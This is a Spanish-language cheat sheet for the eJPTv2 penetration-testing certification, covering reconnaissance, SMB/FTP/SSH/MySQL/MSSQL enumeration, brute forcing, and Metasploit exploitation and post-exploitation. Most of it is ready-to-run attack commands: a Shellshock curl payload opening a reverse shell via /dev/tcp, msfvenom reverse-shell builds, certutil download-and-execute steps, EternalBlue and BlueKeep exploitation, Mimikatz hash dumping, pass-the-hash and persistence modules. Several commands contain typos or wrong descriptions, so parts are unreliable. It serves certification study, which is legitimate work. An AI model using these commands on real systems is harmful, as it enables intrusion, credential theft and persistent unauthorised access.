# eJPTv2 Cheat Sheet

## Reconocimiento

```bash
$ whois <URL>
```

```
$ host <URL>
```

```
$ whatweb <URL>
```

```bash
$ dnsrecon -d <URL>
```

https://dnsdumpster.com

```bash
$ wafw00f <URL>
```

```
$ sublist3r -d <URL> -e <engines>
```

```
$ theHarvester -d <URL> -b <engines>
```

## Descubrimiento de Hosts / Enumeración

### fping

```bash
$ fping -a -g <IP-RANGE> 2>/dev/null
```

- `-a` solo muestra hosts activos
- `-g` envía una traza icmp a un rango de direcciones IP

Ejemplo:

```bash
$ fping -a -g 192.168.1.0/24 2>/dev/null > hosts.txt
```

Combinación de `fping` con `nmap`

```bash
$ fping -a -g 192.168.1.0/24 2>/dev/null
$ nmap -sn -iL hosts.txt
```

### Nmap

#### Descubrimiento de host - Ping Scan

```bash
$ sudo nmap -sn 192.168.1.0/24
```

- `-sn` Esta opción le dice a Nmap que no haga un escaneo de puertos después del descubrimiento de hosts y que sólo imprima los hosts disponibles que respondieron a la traza icmp.

#### Escaneo de puertos

```bash
$ sudo nmap -p- --open -Pn -n 192.168.1.10 -vvv -oG scanPorts
```

Parámetros utilizados:

- `-sS`: Realiza un TCP SYN Scan para escanear de manera sigilosa, es decir, que no completa las conexiones TCP con los puertos de la máquina víctima.
- `-p-`: Indica que debe escanear todos los puertos (es igual a `-p 1-65535`).
- `--min-rate 5000`: Establece el número mínimo de paquetes que nmap enviará por segundo.
- `-Pn`: Desactiva el descubrimiento de host por medio de ping.
- `-vvv`: Activa el modo _verbose_ para que nos muestre resultados a medida que los encuentra.
- `-oG`: Determina el formato del archivo en el cual se guardan los resultados obtenidos. En este caso, es un formato _grepeable_, el cual almacena todo en una sola línea. De esta forma, es más sencillo procesar y obtener los puertos abiertos por medio de expresiones regulares, en conjunto con otras utilidades como pueden ser grep, awk, sed, entre otras.

#### Versión y Servicio

```bash
$ sudo nmap -sCV -p<PORTS> 192.168.1.10 -oN targeted -vvv
```

- `-sCV` Es la combinación de los parámetros `-sC` y `-sV`. El primero determina que se utilizarán una serie de scripts básiscos de enumeración propios de nmap, para conocer el servicio que esta corriendo en dichos puertos. Por su parte, segundo parámetro permite conocer más acerca de la versión de ese servicio.
- `-p-`: Indica que debe escanear todos los puertos (es igual a `-p 1-65535`).
- `-oN`: Determina el formato del archivo en el cual se guardan los resultados obtenidos. En este caso, es el formato por defecto de nmap.
- `-vvv`: Activa el modo _verbose_ para que nos muestre resultados a medida que los encuentra.

### Enrutamiento

Para borrar completamente la tabla de enrutamiento, ejecutamos lo siguiente:

```bash
$ route -n
```

Utilizarlos al configurar una ruta para que el destino y la puerta de enlace queden más claros

#### Mostrar la tabla de enrutamiento

En Windows y Linux podemos usar:

```bash
$ arp -a
```

En Linux, podemos usar:

```bash
$ ip route
```

#### Configurar una ruta con `ip route`

```bash
$ ip route add <Network To Access> via <Gateway Address>
```

Ejemplo:

```bash
$ ip route add 192.168.1.0/24 via 10.10.10.1
```

Esto añade una ruta a la red 192.168.1.0/24 a través del router 10.10.10.1.

## Servicios Comunes

Servicios comunes y puertos por defecto.

### TCP

| **Port** | **Servicio**  |
| -------- | ------------- |
| 21       | FTP           |
| 22       | SSH           |
| 23       | Telnet        |
| 25       | SMTP          |
| 53       | DNS           |
| 80       | HTTP          |
| 110      | POP3          |
| 139      | SMB - NetBios |
| 445      | SMB           |
| 143      | IMAP          |
| 443      | HTTPS         |

#### UDP

| **Puerto** | **Servicio** |
| ---------- | ------------ |
| 53         | DNS          |
| 67         | DHCP         |
| 68         | DHCP         |
| 69         | TFTP         |
| 161        | SNMP         |

### SMB

SMB (Server Message Block) es un protocolo de compartición de archivos en red que se utiliza para facilitar la compartición de archivos y periféricos (impresoras y puertos serie) entre ordenadores de una red local (LAN).

- SMB utiliza el puerto 445 (TCP). Sin embargo, originalmente, SMB se ejecutaba sobre NetBIOS utilizando puerto 139.
- SAMBA es la implementación Linux de código abierto de SMB, y permite a los sistemas Windows acceder a recursos compartidos y dispositivos Linux acceder a recursos compartidos y dispositivos Linux.

El protocolo SMB utiliza dos niveles de autenticación, a saber:

- **Autenticación de usuario**: los usuarios deben proporcionar un nombre de usuario y una contraseña para autenticarse con el servidor SMB para acceder a un recurso compartido.
- **Autenticación de recurso compartido**: los usuarios deben proporcionar una contraseña para acceder a un recurso compartido restringido. a un recurso compartido restringido.

Puerto por defecto (445)

#### Nmap

Scripts de `nmap` utiles para este servicio:

- smb-ls
- smb-protocols
- smb-security-mode
- smb-enum-sessions
- smb-enum-shares
- smb-enum-users
- smb-enum-groups
- smb-enum-domains
- smb-enum-services

Sintaxis:

```bash
$ nmap -p445 --script <script> <IP-TARGET>
```

#### smbclient

Es un cliente que nos permite acceder a recursos compartidos en servidores SMB.

```bash
$ smbclient //<IP-TARGET>/Public -U elliot # Realiza una conexión con el usario elliot
```

```bash
$ smbclient //<IP-TARGET>/Public -N # Conexión utilizando una sesión nula
```

```bash
$ smbclient -L <IP-TARGET> -N # Lista recursos compartidos
```

#### smbmap

SMBMap permite a los usuarios enumerar las unidades compartidas samba en todo un dominio. Enumera las unidades compartidas, los permisos de las unidades, el contenido compartido, la funcionalidad de carga/descarga, la coincidencia de patrones de descarga automática de nombres de archivo e incluso la ejecución de comandos remotos.

```bash
$ smbmap -u guest -p "" -d . -H <IP-TARGET>
```

```bash
$ smbmap -u <USER> -p <PASSWORD> -H <IP-TARGET> -L
```

```bash
$ smbmap -u <USER> -p <PASSWORD> -H <IP-TARGET> -r 'C$'
```

```bash
$ smbmap -H <IP-TARGET> -u <USER> -p <PASSWORD> --upload '/root/file' 'C$\file'
```

```bash
$ smbmap -H <IP-TARGET> -u <USER> -p <PASSWORD> --download 'C$\file'
```

```bash
$ smbmap -u <USER> -p <PASSWORD> -H <IP-TARGET> -x 'ipconfig'
```

#### enum4linux

Enum4linux es una herramienta utilizada para extraer información de hosts de Windows y Samba. La herramienta está escrita en Perl y envuelta en herramientas de samba smbclient, rpclient, net y nslookup.

```bash
$ enum4linux -o <IP-TARGET> # OS
```

```bash
$ enum4linux -U <IP-TARGET> # Listar usuarios
```

```bash
$ enum4linux -G <IP-TARGET> # Listar grupos
```

```bash
$ enum4linux -S <IP-TARGET> # Listar recursos compartidos
```

```bash
$ enum4linux -i <IP-TARGET> # Comprobar si el servidor smb esta configurado para imprimir
```

```bash
$ enum4linux -r -u <user> -p <password> <IP-TARGET>
```

#### rpcclient

rpcclient es una utilidad que forma parte del conjunto de herramientas Samba. Se utiliza para interactuar con el protocolo Remote Procedure Call (RPC) de Microsoft, que se utiliza para la comunicación entre los sistemas basados en Windows y otros dispositivos. rpcclient se utiliza principalmente para fines de depuración y pruebas, y se puede utilizar para consultar y manipular sistemas remotos.

```bash
$ rpcclient -U "" -N <IP-TARGET>
  srvinfo # SMB version
```

```bash
$ rpcclient -U "" -N <IP-TARGET>
  enumdomusers # SMB users
```

```bash
$ rpcclient -U "" -N <IP-TARGET> # SMB users
  lookupnames admin # SID of user "admin"
```

```bash
$ rpcclient -U "" -N <IP-TARGET> # SMB users
  enumdomgroups # Domain Groups
```

#### Hydra

```bash
$ hydra -l admin -P /usr/share/wordlist/rockyou.txt <IP-TARGET> smb
```

#### net

```powershell
$ net share
$ net use * \delete # borrar el recurso compartido
$ net use z: \\<IP-TARGET>\c$ <password> /user:<username> # montar el recurso compartido
```

#### Metasploit

Modulos utiles:

- auxiliary/scannner/smb/smb2
- auxiliary/scannner/smb/smb_login
- auxiliary/scannner/smb/smb_enumusers

### FTP

Puerto por defecto (21)

El Protocolo de transferencia de archivos es un protocolo de red para la transferencia de archivos entre sistemas conectados a una red TCP, basado en la arquitectura cliente-servidor.

#### Nmap

Scripts de nmap utiles para este servicio:

- ftp-anon
- ftp-brute

```bash
$ echo "sysadmin" > users
% nmap <IP-TARGET> --script ftp-brute --script-args userdb=/root/users -p 21
```

##### FTP Login Anonymous

```bash
$ nmap <IP-TARGET> --script ftp-anon -p 21
```

#### Hydra

```bash
$ hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.10.11.230 ftp
```

### SSH

Puerto por defecto (22)

```bash
$ ssh root@<IP-TARGET>
```

#### Nmap

Scripts de nmap utiles para este servicio:

- ssh-brute
- ssh-hostkey

```bash
$ echo "administrator" > users
$ nmap <IP-TARGET> -p 22 --script ssh-brute --script-args userdb=/root/user
```

#### Metasploit

- auxiliary/scanner/ssh/ssh_login

### HTTP / HTTPS

Puertos por defecto HTTP (80) HTTPS (443)

#### Nmap

Scripts de nmap utiles para este servicio:

- http-enum
- http-headers
- http-webdav-scan

```bash
$ nmap <IP-TARGET> -p 80 --script http-enum -vvv
```

```bash
$ nmap <IP-TARGET> -p 80 --script http-headers -vvv
```

```bash
$ nmap <IP-TARGET> -p 80 --script http-webdav-scan --script-args http-methods.url-path=/webdav/ -vvv
```

#### Metasploit

- auxiliary/scanner/http/http_version
- auxiliary/scanner/http/brute_dirs
- auxiliary/scanner/http/robots_txt

#### browsh

```bash
$ browsh --starup-url <IP-TARGET>
```

#### lynx

```bash
$ lynx http://<IP-TARGET>
```

### MySQL

Puerto por defecto (3306)

#### Nmap

Scripts de nmap utiles para este servicio:

- mysql-empty-password
- mysql-info
- mysql-databases
- mysql-users
- mysql-variables
- mysql-dump-hashes
- mysql-audit

Comprueba si el password de _root_ es vacío.

```bash
$ nmap --script=mysql-empty-password -p 3306 <IP-TARGET>
```

```bash
$ nmap --script=mysql-info -p 3306 <IP-TARGET>
```

Lista las base de datos

```bash
$ nmap --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''" -p 3306 <IP-TARGET>
```

Lista los usuarios de la base de datos

```bash
$ nmap --script=mysql-users --script-args="mysqluser='root',mysqlpass=''" -p 3306 <IP-TARGET>
```

```bash
$ nmap --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''" -p 3306 <IP-TARGET>
```

Dump hashes

```bash
$ nmap --script=mysql-dump-hashes --script-args="username='root',password=''" -p 3306 <IP-TARGET>
```

```bash
$ nmap <IP-TARGET> -p 3306 --script=mysql-audit --script-args="mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'" -vvv
```

Ejecuta una consulta

```bash
$ nmap <IP-TARGET> -p 3306 --script=mysql-query --script-args="query='select * from books.authors;',username='root',password=''" -vvv
```

#### Hydra

```bash
$ hydra -l root -P /usr/share/metasploit-framework/data/wordlist/unix_passwords.txt <IP-TARGET> mysql
```

#### Metasploit

Modulos utiles de metasploit para este servicio:

- auxiliary/scanner/mysql/mysql_schemadump
- auxiliary/scanner/mysql/mysql_writable_dirs
- auxiliary/scanner/mysql/mysql_file_enum
- auxiliary/scanner/mysql/mysql_login
- auxiliary/scanner/mysql/mysql_hashdump

### MSSQL

Puerto por defecto (1433)

#### Nmap

```bash
$ nmap --script ms-sql-info -p 1433 <IP-TARGET>
```

Comprobar autenticación NTLM

```bash
$ nmap --script ms-sql-ntlm-info --script-args mssql.instance-port 1433 <IP-TARGET>
```

Enumerar usuarios y contraseña validos para MSSQL

```bash
$ nmap -p 1433 --script ms-sql-brute -script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt <IP-TARGET>
```

Comprobar si el usuario "sa" tiene configurada la contraseña como vacia

```bash
$ nmap -p 1433 --script ms-sql-empty-password <IP-TARGET>
```

Extraer todos los usuarios con sesión con una consulta sql

```bash
$ nmap -p 1433 --script ms-sql-query --script-args mssql.username=<USER>,mssql.password=<PASSWORD>,ms-sql-query="SELECT * FROM master..syslogins" <IP-TARGET> -oN output.txt
```

Extraer todos los hashes de los usuarios

```bash
$ nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=<USER>,mssql.password=<PASSWORD> <IP-TARGET>
```

Ejecutar un comando en la máquina victima usando `xp_cmdshell`

```bash
$ nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=<USER>,mssql.password=<PASSWORD>,ms-sql-xp-cmdshell.cmd="type c:\flag.txt" <IP-TARGET>
```

#### Metasploit

- auxiliary/scanner/mssql/mssql_login
- auxiliary/admin/mssql/mssql_enum
- auxiliary/admin/mssql/mssql_enum_sql_logins
- auxiliary/admin/mssql/mssql_exec
- auxiliary/admin/mssql/mssql_enum_domain_accounts

## Explotación en Windows

### WebDav

WebDAV es un protocolo que nos permite **guardar archivos, editarlos, moverlos y compartirlos** en un servidor web, no necesitaremos utilizar otros protocolos de intercambio de archivos en red local o Internet, como Samba, FTP o NFS. El objetivo de WebDAV es que se pueda trabajar directamente en el servidor web, sin necesidad de utilizar protocolos adicionales para el manejo remoto (o local) de los archivos. Este protocolo nos permite que los servidores web puedan aparecer como unidades de red en nuestro PC.

### Microsoft IIS WebDAV

```bash
$ hydra -L /usr/share/wordlist/metasploit/common_users.txt -P /usr/share/wordlist/metasploit-framework/common_passwords.txt <IP-TARGET> http-get /webdav/
```

#### davtest

Davtest es un escáner WebDAV que envía archivos exploit al servidor WebDAV y automáticamente crea el directorio y carga archivos de diferentes formatos. La herramienta también intenta ejecutar los archivos cargados y nos da una salida de los archivos ejecutados con éxito.

```bash
$ davtest -url http://<IP-TARGET>/webdav -auth <USER>:<PASSWORD>
```

#### cadaver

Cadaver es una herramienta para clientes WebDAV, que soporta una interfaz estilo línea de comandos. Admite operaciones como subir archivos, editarlos, moverlos, etc.

```bash
$ cadaver http://<IP-TARGET>/webdav
$ put /usr/share/webshells/asp/webshell.asp
```

#### Metasploit

Creamos el payload utilizando _msfvenom_

```bash
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP-LOCAL> LPORT=<LOCAL-PORT> -f asp > shell.asp
```

Subimos el payload usando _cadaver_

```bash
$ cadaver http://<IP-TARGET>/webdav
put /root/shell.asp
```

```bash
$ msfconsole
msf6> use multi/handler
msf6> set payload windows/meterpreter/reverse_tcp
msf6> set LHOST <IP-LOCAL>
msf6> set LPORT <LOCAL-PORT>
msf6> run
```

Usando solo _mestasploit_

```bash
$ msfconsole
msf6> use exploit/windows/iis/iis_webdav_upload_asp
msf6> set HttpUsername bob
msf6> set HttpPassword password_123321
msf6> set rhost <IP-TARGET>
msf6> set rport <PORT-TARGET>
msf6> set path /webdav/metasploit.asp
msf6> set lhost <IP-LOCAL>
msf6> set lport <PORT-LOCAL>
msf6> run
```

### SMB

#### PsExec

- PsExec es un ligero sustituto de telnet desarrollado por Microsoft que permite ejecutar procesos en sistemas Windows remotos utilizando las credenciales de cualquier usuario.
- La autenticación de PsExec se realiza a través de SMB.
- Podemos utilizar la utilidad PsExec para autenticarnos con el sistema de destino legítimamente y ejecutar comandos arbitrarios o lanzar un comando remoto.
- Es muy similar a RDP, sin embargo, en lugar de controlar el sistema remoto a través de GUI, los comandos se envían a través de CMD.

```bash
$ msfconsole
msf6> use auxiliary/scanner/smb/smb_login
msf6> set user_file /usr/share/metasploit-framework/data/wordlist/common_users.txt
msf6> set user_file /usr/share/metasploit-framework/data/wordlist/unix_passwords.txt
msf6> set rhost <IP-TARGET>
msf6> set stop_on_success true
msf6> set verbose false
msf6> run
```

```bash
$ psexec.py Administrator@<IP-TARGET> cmd.exe
```

Usando solo _mestasploit_

```bash
msf6> use exploit/windows/smb/psexec
msf6> set rhost <IP-TARGET>
msf6> set SMBUser Administrator
msf6> set SMBPass quertyuiop
msf6> run
```

### Windows (MS17-010 / CVE-2017-0144) EternalBlue SMB

Podemos comprobar si la máquina víctima es vulnerable a _MS17-010_ usando el script de nmap _smb-vuln-ms17-010_.

```bash
$ nmap -sV -p 445 --script smb-vuln-ms17-010 <IP-TARGET>
```

https://github.com/3ndG4me/AutoBlue-MS17-010

```bash
$ cd shellcode
$ chmod +x shell_prep.sh
$ ./shell_prep.sh
$ # En este punto se configura el puerto y host al cual se enviara la revershell
$ cd ..
$ python eternalblue_exploit7.py <IP-TARGET> shellcode/sc_x64.bin
```

```bash
$ nc -nlvp 4444
```

Usando solo _mestasploit_

```bash
$ msfconsole
msf6> use exploit/windows/smb/ms17_010_eternalblue
msf6> set RHOSTS <IP-TARGET>
msf6> exploit
```

### RDP

Puerto por defecto (3389)

#### Metasploit

Detectamos la versión de RDP que esta corriendo en la máquina objetivo.

```bash
$ msfconsole
msf6> use auxiliary/scanner/rdp/rdp_scanner
msf6> set RHOSTS <IP-TARGET>
msf6> set RPORT <PORT-TARGET>
msf6> run
```

#### Hydra

```bash
$ hydra -L /usr/share/metasploit-framework/data/wordlist/common_users.txt -P /usr/share/metasploit-framework/data/wordlist/unix_passwords.txt rdp://<IP-TARGET> -s <PORT-TARGET>
```

#### xfreerdp

Utilizamos _xfreerdp_ para conectarnos por rdp con las credenciales obtenidas

```bash
$ xfreerdp /u:administrator /p:<PASSWORD> /v:<IP-TARGET>:<PORT-TARGET>
```

### Exploiting Windows CVE-2019- 0708 RDP Vulnerability (BlueKeep)

#### Metasploit

```bash
$ msfconsole
msf6> use auxiliary/scanner/cve_2019_0708_bluekeep
msf6> set RHOSTS <IP-TARGET>
msf6> run
```

```bash
$ msfconsole
msf6> use exploit/rdp/cve_2019_0708_bluekeep_rce
msf6> set RHOSTS <IP-TARGET>
msf6> show targets
msf6> set target 2
msf6> run
```

### Exploiting WinRM

#### Crackmapexec

##### Fuerza bruta

```bash
$ crackmapexec winrm <IP-TARGET> -u <USER> -p /usr/share/metasploit-framework/data/wordlist/unix_passwords.txt
```

##### Ejecución de comandos

```bash
$ crackmapexec winrm <IP-TARGET> -u <USER> -p <PASSWORD> -x "whoami"
```

### evil-winrm.rb

```bash
$ evil-winrm.rb -u <USER> -p <PASSWORD> -i <IP-TARGET>
```

#### Metasploit

```bash
$ msfconsole
msf6> use exploit/windows/winrm/winrm_script_exec
msf6> set RHOSTS <IP-TARGET>
msf6> set FORCE_VBS true
msf6> set USERNAME <USER>
msf6> set PASSWORD <PASSWORD>
msf6> run
```

## Linux

### CVE-2014-6271 - Shellshock

```bash
$ nmap -sCV --sript http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" <IP-TARGET>
```

```bash
$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' http://<IP-TARGET>/file.cgi
```

---

# Metasploit Framework (MSF)

```bash
msf6 > search x                                        # realiza busquedas de modulos
msf6 > workspace -a <name>                             # crea un nuevo espacio de trabajo
msf6 > use 1                                           # usar exploit (por número)
msf6 > use exploit/linux/samba/is_known_pipename       # usar exploit (por nombre)
msf6 > show options                                    # listar las opciones del modulo
msf6 > set payload windows/x64/meterpreter/reverse_tcp # setear parámetros
msf6 > sessions -l                                     # lista las sesiones
msf6 > sessions -u <session-id>                        # actualiza una sesión a Meterpreter
```

Ejemplo: Por ejemplo, para configurar un listener para un reverse shell:

```bash
$ msfconsole
msf6> use exploit/multi/handler
msf6> set payload <REVERSE SHELL PAYLOAD>
msf6> set LHOST <IP-LOCAL>
msf6> set LPORT <LOCAL-PORT>
msf6> run
```

### Msfvenom

Creación de payloads usando `msfvenom`

Windows reverse shell:

```bash
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LISTENER IP> LPORT=<LISTENER PORT> -f dll > shell.dll
```

Linux reverse shell:

```bash
$ msfvenom -p linux/x64/shell/reverse_tcp LHOST=<LISTENER IP> LPORT=<LISTENER PORT> -f elf > shell.elf
```

PHP reverse shell:

```bash
$ msfvenom -p php/reverse_php LHOST=<LISTENER IP> LPORT=<LISTENER PORT> -o <OUTPUT FILE NAME>
```

### Comandos de Meterpreter

```bash
meterpreter > background                             # envía la sesión actual a segundo plano
meterpreter > session -l                             # lista las sesiones abiertas actualmente
meterpreter > session -i <SESSION-ID>                # se conecta a una sesión
meterpreter > getsyste                               # escalación de privilegios (Windows)
meterpreter > sysinfo                                # lista información del sistema
meterpreter > getuid                                 # lista información del sistema
meterpreter > route                                  # lista información del sistema
meterpreter > hashdump                               # Dump Windows hashes
meterpreter > upload <FILENAME> /path/to/directory   # sube un archivo
meterpreter > download <FILENAME> /path/to/directory # descarga un archivo
```

Listener con `netcat`

```bash
$ nc -nlvp PORT
```

- `n`: dirección IP
- `v`: modo verbose
- `l`: escuchar las conexiones entrantes
- `p`: puerto local de escucha

Ejemplo:

```bash
$ nc -lnvp 1234
```

Generar un terminal interactivo a través de Python:

```bash
$ which python                                   # Comprobamos si el sistema tiene instalado Python
/usr/bin/python
$ python -c "import pty; pty.spawn('/bin/bash')" # Luego, lanzamos una terminal interactiva usando el modulo pty
$ export TERM=xterm                              # Por último, exportar XTERM
```

### Importando el resultado del escaneo con nmap dentro de MSF

```bash
> nmap -Pn -sCV -O -p- --open 10.2.27.169 -vvv -oX enumeration.xml
msf6 > db_import /root/enumeration.xml
msf6 > hosts
msf6 > services
```

```bash
msf6 > db_nmap -Pn -sCV -O -p- --open 10.2.27.169
```

### Enumeración FTP

```bash
msf6 > search type:auxiliary name:ftp
```

Modulos utiles:

- auxiliary/scannner/ftp/ftp_version
- auxiliary/scannner/ftp/ftp_login
- auxiliary/scannner/ftp/ftp_anonymous

### Enumeración SMB

```bash
msf6 > search type:auxiliary name:smb
```

Modulos utiles:

- auxiliary/scanner/smb/smb_version
- auxiliary/scannner/smb/smb2
- auxiliary/scannner/smb/smb_login
- auxiliary/scanner/smb/smb_enumusers

### Enumeración HTTP

```bash
msf6 > search type:auxiliary name:http
```

Modulos utiles:

- auxiliary/scanner/http/apache_userdir_enum
- auxiliary/scanner/http/brute_dirs
- auxiliary/scanner/http/dir_scanner
- auxiliary/scanner/http/dir_listing
- auxiliary/scanner/http/http_put
- auxiliary/scanner/http/files_dir
- auxiliary/scanner/http/http_login
- auxiliary/scanner/http/http_header
- auxiliary/scanner/http/http_version
- auxiliary/scanner/http/robots_txt

### Enumeración MySQL

Modulos utiles:

- auxiliary/admin/mysql/mysql_enum
- auxiliary/admin/mysql/mysql_sql
- auxiliary/scanner/mysql/mysql_file_enum
- auxiliary/scanner/mysql/mysql_hashdump
- auxiliary/scanner/mysql/mysql_login
- auxiliary/scanner/mysql/mysql_schemadump
- auxiliary/scanner/mysql/mysql_version
- auxiliary/scanner/mysql/mysql_writable_dirs

## Enumeración SSH

Modulos utiles:

- auxiliary/scanner/ssh/ssh_version
- auxiliary/scanner/ssh/ssh_login

### Enumeración SMTP

Modulos utiles:

- auxiliary/scanner/smtp/smtp_enum
- auxiliary/scanner/smtp/smtp_version

## HFS - Http File Server

```bash
$ msfconsole
msf6> workspace -a HFS
msf6> setg RHOSTS <IP-TARGET>
msf6> db_nmap -sS -SCV -p- --open -O <IP-TARGET> -vvv
msf6> search type:exploit name: HttpFileServer httpd 2.3
msf6> use 0
msf6> run
```

## Apache Tomcat Web Server

1. Ejecutamos el exploit

```bash
$ msfconsole
msf6> workspace -a Tomcat
msf6> setg RHOSTS <IP-TARGET>
msf6> db_nmap -sS -SCV -p- --open -O <IP-TARGET> -vvv
msf6> search type:exploit name:tomcat
msf6> use multi/http/tomcat_jsp_upload_bypass
msf6> set payload java/jsp_shell_bind_tcp
msf6> set SHELL cmd
msf6> run
msf6> CTRL + Z
msf6> sessions
```

2. Creamos el palyload de meterpreter

```bash
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=1234 -f exe > meterpreter.exe
$ python3 -m http.server 80
```

3. Descargamos el payload en la máquina victima

```bash
$ sessions 1
$ certutil -urlcache -f http://<ATTACK-IP>/meterpreter.exe meterpreter.exe
```

4. Creamos el listener

```bash
msf6> use multi/handler
msf6> set PALYLOD windows/meterpreter/reverse_tcp
msf6> set LHOST <LHOST>
msf6> set LHOST 1234
msf6> run
```

5. Ejecutamos el payload en la máquina victima

```bash
$ \meterpreter.exe
```

---

## Explotación Linux

### FTP Server - Vsftpd 2.3.4 - Backdoor

```bash
$ msfconsole
msf6> workspace -a vsftpd2.3.4
msf6> setg <IP-TARGET>
msf6> db_nmap -sS -sCV -p- --open -O -Pn -n <IP-TARGET> -vvv
msf6> search vsfpd
msf6> use 0
```

### Samba

```bash
$ msfconsole
msf6> workspace -a samba
msf6> setg <IP-TARGET>
msf6> db_nmap -sS -sCV -p- --open -O -Pn -n <IP-TARGET> -vvv
msf6> search type:exploit name:smb
msf6> use exploit/linux/samba/is_known_pipename
msf6> run
CTRL + Z
msf6> sessions -u 1
meterpreter>
```

## SSH

```bash
$ msfconsole
msf6> workspace -a ssh
msf6> setg <IP-TARGET>
msf6> db_nmap -sS -sCV -p- --open -O -Pn -n <IP-TARGET> -vvv
msf6> search libssh_auth_bypass
msf6> use auxiliary/scanner/ssh/libssh_auth_bypass
msf6> set SPAWN_PTY true
msf6> run
msf6> sessions 1
```

## SMTP

Haraka smtpd 2.8.8

```bash
$ msfconsole
msf6> workspace -a haraka
msf6> setg <IP-TARGET>
msf6> db_nmap -sS -sCV -p- --open -O -Pn -n <IP-TARGET> -vvv
msf6> hosts
msf6> services
msf6> search type:exploit name:Haraka
msf6> use exploit/linux/smtp/haraka
msf6> options
msf6> info
msf6> services
msf6> set SRVPORT 9898
msf6> set email_to root@attackdefense.test
msf6> set payload linux/x64/4/meterpreter_reverse_http
msf6> set payload linux/x64/meterpreter_reverse_http
msf6> options
msf6> ip a
msf6> set LHOST 192.76.184.2
msf6> options
msf6> run
```

---

## Post Explotación - Meterpreter

### Actualizar una shell normal a una shell de Meterpreter

```bash
msf6> session -u <session-id>
```

---

## Windows Modulos de post explotación

**IMPORTANTE**: Para poder utilizar estos modulos, es necesario tener una sesión establecida en la máquina victima.

```bash
meterpreter> getsystem
meterpreter> getuid
meterpreter> show_mount
meterpreter> migrate <PID>
CTRL + Z
msf6 > search win_privs
msf6 > use post/windows/gather/win_privs
msf6 post (windows/gather/win_privs) >
msf6 > search enum_logged_on_users
msf6 > use post/windows/gather/enum_logged_on_users
msf6 > set session 1
msf6 > loot
```

#### post/windows/gather/win_privs

Este modulo nos permite conocer los privilegios del usuario.

#### post/windows/gather/enum_logged_on_users

Nos permite conocer los usuarios que inician sesión con frecuencia en el sistema.

#### post/windows/gather/checkvm

Nos permite conocer si el sistema operativo esta corriendo dentro de una máquina virtual.

#### post/windows/gather/enum_applications

Enumera las aplicaciones instaladas en la máquina victima

#### post/windows/gather/enum_av_excluded

Permite detectar carpetas que son excluidas del escaneo realizado por el antivirus.

#### post/windows/gather/enum_computers

Comprueba si el host es parte de un dominio.

#### post/windows/gather/enum_patches

Lista los parches aplicados

#### post/windows/gather/enum_shares

Lista los recursos compartidos

---

### Escalación de Privilegios en Windows - Bypassing UAC

#### exploit/windows/local/bypassuac_injection

### Suplantación de Token con Incognito

```bash
meterpreter > load incognito # En este punto ya ganamos acceso a la máquina victima
meterpreter > list_tokens -u
meterpreter > impersonate_token "ATTACKDEFENSE\Administrator"
meterpreter > prgrep explorer.exe
meterpreter > migrate <PID>
```

### Dumping hashes con Mimikatz

```bash
meterpreter > prgrep lsass
meterpreter > migrate <PID>
meterpreter > load kiwi
meterpreter > help
meterpreter > creads_all
meterpreter > lsa_dump_sam
```

### Pass The Hash

```bash
meterpreter > prgrep lsass
meterpreter > migrate <PID>
meterpreter > hashdumps
msf6> search psexec
msf6> use exploit/windows/smb/psexec
msf6> set SMBUser Administrator
msf6> set SMBPass aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d
```

### Establecer persistencia en Windows

```bash
meterpreter > CTRL + Z # Luego de ganado acceso al sistema
msf6> search platform:windows persistence
msf6> use exploit/windows/local/persistence_service
msf6> set payload windows/meterpreter/reverse_tcp
msf6> set SESSSION 1
msf6> run
```

---

## Modulos de Post explotación en Linux

**IMPORTANTE**: Para poder utilizar estos modulos, es necesario tener una sesinón establecida en la máquina victima.

- post/linux/gather/enum_configs
- post/multi/gather/env
- post/linux/gather/enum_network
- post/linux/gather/enum_protections
- post/linux/gather/enum_system
- post/linux/gather/checkcontainer
- post/linux/gather/checkvm
- post/linux/gather/enum_users_history
- post/multi/manage/system_session
- post/linux/manage/download_exec

### Dumping Hashes con Hashdump

**IMPORTANTE**: Para poder utilizar estos modulos, es necesario tener una sesión establecida en la máquina victima.

- post/multi/gather/ssh_creds
- post/multi/gather/docker_creds
- post/linux/gather/hashdump
- post/linux/gather/ecryptfs_creds
- post/linux/gather/enum_psk
- post/linux/gather/enum_xchat
- post/linux/gather/phpmyadmin_credsteal
- post/linux/gather/pptpd_chap_secrets
- post/linux/manage/sshkey_persistence

---

## Fuerza bruta

### `hydra`

```bash
$ hydra -L <LIST OF USERNAMES> -P <LIST OF PASSWORDS> <TARGET> <SERVICE> -s <PORT>
```

```bash
 hydra -l <USERNAME> -P <LIST OF PASSWORDS> <TARGET> <SERVICE> -s <PORT>
```

#### Fuerza bruta al protocolo SSH

```bash
$ hydra -L users.txt -P passwords.txt 192.168.1.10 ssh
$ hydra -L users.txt -P passwords.txt ssh://192.168.1.10
```

#### Fuerza bruta al protocolo FTP

```bash
$ hydra -l admin -P passwords.txt 192.168.1.4 ftp
$ hydra -l admin -P passwords.txt ftp://192.168.1.10
```

### John The Ripper (`jhon`)

```bash
$ unshadow passwd shadow > hash                         # Primero, preparamos un archivo para que John lo descifre:
$ john --wordlist-/usr/share/wordlists/rockyou.txt hash # Crack the passwords
```

```bash
$ john --format=sha512crypt --wordlist-/usr/share/wordlists/rockyou.txt hashes.txt
```

#### NTLM hashes

```bash
$ john --format=NT --wordlist-/usr/share/wordlists/rockyou.txt hashes.txt
```

#### Hashcat

```bash
$ hashcat -a3 -m 1000 hashes.txt --wordlist-/usr/share/wordlists/rockyou.txt
```

- `-m` tipo de hash (1000 - NTLM)

---

## Post Explotación Windows

### Usuarios y Grupos

```bash
> whoami /all
> whoami /priv
> net users
> net user Administrator
> net localgroup administrators
```

